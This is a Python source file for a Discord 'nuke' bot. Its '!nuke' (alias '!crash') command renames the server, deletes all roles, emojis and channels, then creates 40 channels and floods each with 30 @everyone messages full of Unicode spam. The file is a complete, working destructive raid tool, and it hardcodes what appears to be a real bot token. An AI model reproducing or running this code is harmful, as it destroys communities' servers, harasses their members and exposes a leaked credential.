import discord, asyncio # 2.0+
from discord.ext import commands

token = 'MTA5NzEwODEwMTEyOTMwNjIzMw.Gr84_N.5JKtd9WhaS1h0f7iOfTo174NPJ2Q0WDO_VXfTs'
command_prefix = '!'

nuke_guild_name = '▁▂▄▅▆▇█ |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| █▇▆▅▄▂▁▁▂▄▅▆▇█ |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| █▇▆▅▄▂▁'

nuke_channel_name = '𒀱𒈓𒈙'
nuke_channel_amount = 40

nuke_spam_text = '!!@everyone @here 𒀱𒈓𒈙꧅𒈙ဪဪV𒀱𒈓𒈙꧅𒈙𒈙ဪဪV ﷽ ﷽𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃𒈓𒈙꧅𒈙𒈙ဪဪ﷽𒅌꧅꧅𒁎꧅𒀱꧅𒌧 𒀱𒈓𒈙꧅𒈙ဪဪV𒀱𒈓𒈙꧅𒈙𒈙ဪဪV ﷽ ﷽𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃𒈓𒈙꧅𒈙𒈙ဪဪ﷽𒅌꧅꧅𒁎꧅𒀱꧅𒌧'

nuke_spam_amount = 30

client = commands.Bot(command_prefix, case_insensitive=True, intents=discord.Intents.all())

async def createChannel(ctx):
  channel = await ctx.guild.create_text_channel(nuke_channel_name)
  for _ in range(nuke_spam_amount):
    await channel.send(nuke_spam_text)

async def createChannels(ctx):
  for _ in range(nuke_channel_amount):
    asyncio.create_task(createChannel(ctx))

async def deleteChannels(ctx):
  try:
    await asyncio.gather(*[asyncio.create_task(channel.delete()) for channel in ctx.guild.channels])
  except:
    pass

async def deleteRoles(ctx):
  for role in ctx.guild.roles:
    await role.delete()

async def deleteEmojis(ctx):
  for emote in ctx.guild.emojis:
    asyncio.create_task(emote.delete())

async def editGuild(ctx):
  asyncio.create_task(ctx.guild.edit(name=nuke_guild_name, icon=None))


@client.command(aliases=['crash'])
async def nuke(ctx):
  await editGuild(ctx)

  asyncio.create_task(deleteRoles(ctx))
  await deleteEmojis(ctx)
  await deleteChannels(ctx)
  
  await createChannels(ctx)


client.run(token)